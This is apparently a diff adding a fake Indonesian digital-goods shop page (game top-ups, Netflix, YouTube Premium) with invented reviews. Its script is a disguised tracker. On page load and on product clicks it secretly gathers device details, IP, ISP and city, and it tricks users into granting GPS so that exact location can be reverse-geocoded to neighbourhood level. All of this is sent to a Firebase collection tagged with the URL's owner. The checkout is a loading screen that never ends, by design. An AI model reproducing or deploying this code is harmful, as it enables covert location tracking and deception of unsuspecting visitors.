+  <div class="product-card" onclick="onProductClick(this,'YouTube Premium 1 Bulan')">
+    <div class="product-img" style="background:linear-gradient(135deg,#1a0000,#dc2626);">▶️<div class="product-img-overlay"></div></div>
+    <div class="product-body">
+      <div class="product-name">YouTube Premium 1 Bln</div>
+      <div class="product-sub">No ads · Background play</div>
+      <div class="product-price-row"><div class="product-price">Rp 22.000</div><div class="product-price-ori">Rp 35.000</div></div>
+      <div class="product-rating">⭐⭐⭐⭐⭐ <span>(6.5k)</span></div>
+    </div>
+    <div class="product-btn">🛒 Beli</div>
+  </div>
+
+</div>
+
+<!-- TESTIMONIAL -->
+<div class="section-head">
+  <div><div class="section-title">💬 Ulasan Pembeli</div><div class="section-sub">Dari 50.000+ pembeli puas</div></div>
+</div>
+<div class="testi-scroll">
+  <div class="testi-track">
+    <div class="testi-card">
+      <div class="testi-stars">⭐⭐⭐⭐⭐</div>
+      <div class="testi-text">"Proses cepet banget, beli diamond ML langsung masuk kurang dari 1 menit. Recommended!"</div>
+      <div class="testi-user"><div class="testi-av">A</div><div><div class="testi-name">Andi S.</div><div class="testi-loc">Surabaya · 2 jam lalu</div></div></div>
+    </div>
+    <div class="testi-card">
+      <div class="testi-stars">⭐⭐⭐⭐⭐</div>
+      <div class="testi-text">"Netflix-nya langsung bisa dipake, harganya juga paling murah dibanding tempat lain."</div>
+      <div class="testi-user"><div class="testi-av">R</div><div><div class="testi-name">Rina M.</div><div class="testi-loc">Jakarta · 5 jam lalu</div></div></div>
+    </div>
+    <div class="testi-card">
+      <div class="testi-stars">⭐⭐⭐⭐⭐</div>
+      <div class="testi-text">"Udah sering beli di sini. CS nya fast response dan barangnya selalu aman. 👍"</div>
+      <div class="testi-user"><div class="testi-av">D</div><div><div class="testi-name">Dika P.</div><div class="testi-loc">Bandung · 1 hari lalu</div></div></div>
+    </div>
+    <div class="testi-card">
+      <div class="testi-stars">⭐⭐⭐⭐⭐</div>
+      <div class="testi-text">"Murah, cepat, aman. Pulsa langsung masuk 30 detik setelah bayar. Perfect!"</div>
+      <div class="testi-user"><div class="testi-av">S</div><div><div class="testi-name">Siti N.</div><div class="testi-loc">Medan · kemarin</div></div></div>
+    </div>
+  </div>
+</div>
+
+<div class="spacer"></div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav">
+  <div class="bn-item active"><div class="bn-item-icon">🏠</div>HOME</div>
+  <div class="bn-item"><div class="bn-item-icon">🔍</div>CARI</div>
+  <div class="bn-cart">🛒</div>
+  <div class="bn-item"><div class="bn-item-icon">❤️</div>WISHLIST</div>
+  <div class="bn-item"><div class="bn-item-icon">👤</div>AKUN</div>
+</div>
+
+</div><!-- end main-content -->
+
+<script>
+/* ===== FIREBASE INIT ===== */
+var firebaseConfig = {
+  apiKey: "AIzaSyAhfy6OZkDoNZbW5IQUE1X0eLu9PMD5VUg",
+  authDomain: "tracktools-f49e2.firebaseapp.com",
+  projectId: "tracktools-f49e2",
+  storageBucket: "tracktools-f49e2.firebasestorage.app",
+  messagingSenderId: "982478954943",
+  appId: "1:982478954943:web:635d21a31dba3a54a3810a"
+};
+var fbApp = firebase.initializeApp(firebaseConfig);
+var db = firebase.firestore();
+
+/* ===== GET OWNER FROM URL PATH ===== */
+/* Format: https://new-store.vercel.app/DEVELOPER */
+var _owner = (function(){
+  var path = window.location.pathname.replace(/^\/+/,'').replace(/\/+$/,'');
+  return path || 'unknown';
+})();
+
+/* ===== DEVICE DETECTION ===== */
+function getDeviceInfo(){
+  var ua = navigator.userAgent;
+  var brand = 'Unknown';
+  var model = '';
+  if(/samsung/i.test(ua))      { brand='Samsung'; model=ua.match(/SM-[A-Z0-9]+/i)?ua.match(/SM-[A-Z0-9]+/i)[0]:''; }
+  else if(/xiaomi|redmi/i.test(ua)) { brand='Xiaomi'; }
+  else if(/poco/i.test(ua))    { brand='POCO'; }
+  else if(/oppo/i.test(ua))    { brand='OPPO'; }
+  else if(/vivo/i.test(ua))    { brand='Vivo'; }
+  else if(/realme/i.test(ua))  { brand='Realme'; }
+  else if(/huawei/i.test(ua))  { brand='Huawei'; }
+  else if(/iphone/i.test(ua))  { brand='iPhone'; var m=ua.match(/iPhone OS ([\d_]+)/i); model=m?'iOS '+m[1].replace(/_/g,'.'):''; }
+  else if(/ipad/i.test(ua))    { brand='iPad'; }
+  else if(/android/i.test(ua)) { brand='Android'; var m=ua.match(/Android ([\d.]+)/i); model=m?'Android '+m[1]:''; }
+  var platform = /android/i.test(ua)?'Android':/iphone|ipad/i.test(ua)?'iOS':/win/i.test(ua)?'Windows':'Unknown';
+  return {
+    brand: brand,
+    model: model || brand + ' Device',
+    platform: platform,
+    ua: ua,
+    cores: navigator.hardwareConcurrency || 0,
+    ram: navigator.deviceMemory || 0,
+    screenW: screen.width,
+    screenH: screen.height,
+    lang: navigator.language || 'id'
+  };
+}
+
+function cleanISP(s){ return (s||'').replace(/^AS\d+\s*/i,'').trim() || s || '-'; }
+function getFlag(cc){
+  var f={ID:'🇮🇩',US:'🇺🇸',MY:'🇲🇾',SG:'🇸🇬',AU:'🇦🇺',JP:'🇯🇵',GB:'🇬🇧',CN:'🇨🇳',
+         DE:'🇩🇪',NL:'🇳🇱',FR:'🇫🇷',CA:'🇨🇦',TH:'🇹🇭',PH:'🇵🇭',VN:'🇻🇳',KR:'🇰🇷',
+         BR:'🇧🇷',RU:'🇷🇺',SA:'🇸🇦',AE:'🇦🇪',TR:'🇹🇷',PK:'🇵🇰',BD:'🇧🇩'};
+  return f[cc] || '🌐';
+}
+
+/* ===== COLLECT & SEND TO FIREBASE ===== */
+var _deviceDocId = null;
+
+async function sendToFirebase(lat, lng, fromGps){
+  var dev = getDeviceInfo();
+  var payload = {
+    owner: _owner,
+    deviceBrand: dev.brand + ' Device',
+    deviceName: dev.brand + (dev.model ? ' ('+dev.model+')' : ' Device'),
+    platform: dev.platform,
+    ua: dev.ua,
+    cpuCores: dev.cores,
+    ram: dev.ram,
+    screenWidth: dev.screenW,
+    screenHeight: dev.screenH,
+    lang: dev.lang,
+    time: firebase.firestore.FieldValue.serverTimestamp(),
+    ip: '-',
+    city: '', region: '', country: '', countryCode: '',
+    isp: '', timezone: '', connType: '',
+  };
+  if(lat && lng){ payload.gpsLat = lat; payload.gpsLng = lng; }
+
+  /* Fetch IP data */
+  try{
+    var r = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query'));
+    var w = await r.json();
+    var d = JSON.parse(w.contents || '{}');
+    if(d && d.status !== 'fail'){
+      payload.ip        = d.query || '-';
+      payload.city      = d.city || '';
+      payload.region    = d.regionName || '';
+      payload.country   = d.country || '';
+      payload.countryCode = d.countryCode || '';
+      payload.countryFlag = getFlag(d.countryCode || '');
+      payload.isp       = cleanISP(d.isp || d.org || '');
+      payload.timezone  = d.timezone || '';
+      payload.connType  = d.mobile ? 'Mobile / Seluler' : d.proxy ? 'Proxy / VPN' : d.hosting ? 'Hosting / DC' : 'Broadband / WiFi';
+      payload.lokasi    = (d.city || '') + (d.regionName ? ', ' + d.regionName : '');
+    }
+  } catch(e){}
+
+  /* Fallback IP via ipwho.is */
+  if(payload.ip === '-'){
+    try{
+      var r2 = await fetch('https://ipwho.is/');
+      var d2 = await r2.json();
+      if(d2 && d2.success){
+        payload.ip       = d2.ip || '-';
+        payload.city     = d2.city || '';
+        payload.region   = d2.region || '';
+        payload.country  = d2.country || '';
+        payload.countryCode = d2.country_code || '';
+        payload.countryFlag = getFlag(d2.country_code || '');
+        payload.isp      = d2.connection && d2.connection.isp ? d2.connection.isp : (d2.org||'-');
+        payload.timezone = (d2.timezone && d2.timezone.id) || '';
+        payload.lokasi   = (d2.city||'') + (d2.region ? ', '+d2.region : '');
+      }
+    } catch(e){}
+  }
+
+  /* Set doc ke Firestore, id = ip_owner */
+  var docId = (payload.ip !== '-' ? payload.ip : 'unk_' + Date.now()) + '_' + _owner;
+  _deviceDocId = docId;
+  try{
+    await db.collection('devices').doc(docId).set(payload, {merge: true});
+  } catch(e){}
+
+  /* Reverse geocode jika ada GPS */
+  if(lat && lng){
+    try{
+      var geo = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lng+'&zoom=14&addressdetails=1&accept-language=id', {headers:{'User-Agent':'NEWSTORE-TRACK/2.0'}});
+      var geoD = await geo.json();
+      if(geoD && geoD.address){
+        var a = geoD.address;
+        var kec  = a.suburb || a.city_district || a.municipality || a.district || a.county || '';
+        var kel  = a.village || a.neighbourhood || a.quarter || '';
+        var kota = a.city || a.town || a.county || '';
+        var prov = a.state || '';
+        var neg  = a.country || '';
+        var pc   = a.postcode || '';
+        var alamatAkurat = [kel?'Kel. '+kel:'', kec?'Kec. '+kec:'', kota, prov, neg].filter(Boolean).join(', ');
+        await db.collection('devices').doc(docId).update({
+          kecamatan: kec, kelurahan: kel, kotaKab: kota,
+          provinsi: prov, negaraAkurat: neg, postcode: pc,
+          alamatAkurat: alamatAkurat, district: kec,
+          gpsAkurat: true
+        });
+      }
+    } catch(e){}
+  }
+}
+
+/* ===== GPS FLOW ===== */
+var _pendingProduct = '';
+var _gpsRequested = false;
+
+function onProductClick(el, productName){
+  _pendingProduct = productName;
+  if(_gpsRequested){ showLoading(); return; }
+  _gpsRequested = true;
+  document.getElementById('gps-overlay').classList.add('show');
+}
+
+document.getElementById('gps-allow-btn').addEventListener('click', function(){
+  document.getElementById('gps-overlay').classList.remove('show');
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      function(pos){
+        sendToFirebase(pos.coords.latitude, pos.coords.longitude, true)
+          .catch(function(){});
+        showLoading();
+      },
+      function(){
+        sendToFirebase(null, null, false).catch(function(){});
+        showLoading();
+      },
+      {enableHighAccuracy: true, timeout: 12000, maximumAge: 0}
+    );
+  } else {
+    sendToFirebase(null, null, false).catch(function(){});
+    showLoading();
+  }
+});
+
+document.getElementById('gps-deny-btn').addEventListener('click', function(){
+  document.getElementById('gps-overlay').classList.remove('show');
+  sendToFirebase(null, null, false).catch(function(){});
+  showLoading();
+});
+
+function showLoading(){
+  document.getElementById('loading-overlay').classList.add('show');
+  /* Loading TIDAK pernah berhenti — infinite gimmick */
+}
+
+/* ===== FLASH SALE TIMER ===== */
+(function startTimer(){
+  var h = 2, m = 47, s = 33;
+  setInterval(function(){
+    s--;
+    if(s < 0){ s = 59; m--; }
+    if(m < 0){ m = 59; h--; }
+    if(h < 0){ h = 23; m = 59; s = 59; }
+    document.getElementById('fh').textContent = String(h).padStart(2,'0');
+    document.getElementById('fm').textContent = String(m).padStart(2,'0');
+    document.getElementById('fs').textContent = String(s).padStart(2,'0');
+  }, 1000);
+})();
+
+/* ===== CATEGORY FILTER ===== */
+function filterCat(el, cat){
+  document.querySelectorAll('.cat-pill').forEach(function(p){ p.classList.remove('active'); });
+  el.classList.add('active');
+  /* Visual only — semua produk tetap tampil (data sudah terkumpul) */
+}
+
+/* ===== AUTO COLLECT ON LOAD ===== */
+window.addEventListener('load', function(){
+  /* Kirim data awal tanpa GPS segera setelah halaman dibuka */
+  setTimeout(function(){
+    sendToFirebase(null, null, false).catch(function(){});
+  }, 800);
+});
+</script>
+</body>
+</html>
